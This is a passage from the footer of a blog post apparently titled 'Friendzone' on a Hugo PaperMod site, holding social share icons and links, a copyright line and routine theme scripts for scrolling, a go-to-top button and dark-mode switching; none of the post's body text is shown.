423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Friendzone on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fpwndside.github.io%2fposts%2ffriendzone-htb%2f&title=Friendzone"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Friendzone on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fpwndside.github.io%2fposts%2ffriendzone-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Friendzone on whatsapp" href="https://api.whatsapp.com/send?text=Friendzone%20-%20https%3a%2f%2fpwndside.github.io%2fposts%2ffriendzone-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Friendzone on telegram" href="https://telegram.me/share/url?text=Friendzone&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2ffriendzone-htb%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://pwndside.github.io/>PwndSide</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>